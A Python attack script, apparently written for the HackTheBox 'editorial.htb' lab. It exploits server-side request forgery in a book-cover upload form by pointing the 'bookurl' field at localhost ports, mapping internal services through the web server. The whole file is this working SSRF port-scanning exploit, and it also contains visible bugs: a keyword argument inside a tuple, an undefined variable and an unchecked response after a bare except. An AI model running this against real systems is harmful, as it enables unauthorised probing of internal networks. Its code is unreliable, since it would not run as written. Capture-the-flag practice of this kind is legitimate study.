import requests
import time
import threading
#import argparse

BEGIN = int(time.time())
IMAGEFILE = open('~/editorial/www/NoMachine-recording.png', 'rb')

BADRESPONSE = '/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg'
TOP_PORTS = "top-1000-ports.txt"

URL = 'http://editorial.htb/upload-cover'
HEADERS = {
    'Host': 'editorial.htb',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Origin': 'http://editorial.htb',
    'Connection': 'close',
    'Referer': 'http://editorial.htb/upload'
}

count = [0,0]

'''
def parserInit():
    parser = argparse.ArgumentParser(description="Form Fuzzer")
    parser.add_argument('-u', '--url', help='Target URL/PATH', type=str)
    parser.add_argument('--lower', help='Integer Range Lower', type=int)
    parser.add_argument('--upper', help='Integer Range Upper', type=int)
    parser.add_argument('-w', '--wordlist', help='Path to Wordlist', type=str)
'''

def port_fuzz_top(ports, IMAGEFILE, progress=False):
    found = []
    for p in ports:
        #p = p.strip('\n')
        target_url = "http://127.0.0.1:" + p
        multipart_form_data = {
            'bookurl': (None, target_url),
            'bookfile': ('NoMachine-recording.png', IMAGEFILE, 'image/png')
        }

        try:
            r = requests.post(URL, headers=HEADERS, files=multipart_form_data, timeout=0.1)
        except:
            pass

        if r.text != BADRESPONSE:
            entry = f"{r.text}\tport={p}"
            found.append(entry)
            print(f"\n[FOUND] {entry}")
        
        if progress == False:
            count[1] = count[1] + 1
        else:
            count[0] = count[0] + 1
            total = count[0] + count[1]
            #percentage = int((count/1000)*100)
            print(f"[PROGRESS] {total}/1000", end='\r')
    if progress == True:
        print("[PROGRESS] 1000/1000")
    return found

def port_fuzz_all(lower=1, upper=65536):
    found = []
    for x in range(lower,upper):
        target_url = "http://127.0.0.1:" + str(x)
        multipart_form_data = {
            'bookurl': (None, target_url),
            'bookfile': ('NoMachine-recording.png', open('/home/ancientlore/editorial/www/NoMachine-recording.png', 'rb'), 'image/png')
        }
        r = requests.post(URL, headers=HEADERS, files=multipart_form_data)
        if r.text != BADRESPONSE:
            entry = f"{r.text}\tport={p}"
            found.append(entry)
            print(f"[FOUND] {entry}")
    return found

def main():
    with open(TOP_PORTS, 'r') as tp:
        ports = tp.readlines()
    m = (len(ports)) // 2
    lower = [ports[x].strip('\n') for x in range(0,m)]
    upper = [ports[x].strip('\n') for x in range(m,len(ports))]   
    t1 = threading.Thread(target=port_fuzz_top, args=(lower, IMAGEFILE))
    t2 = threading.Thread(target=port_fuzz_top, args=(upper, IMAGEFILE, progress=True))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    IMAGEFILE.close()
    print("\n[COMPLETE]")
    print(str(int(time.time()) - BEGIN) + " Seconds")

if __name__ == "__main__":
    main()
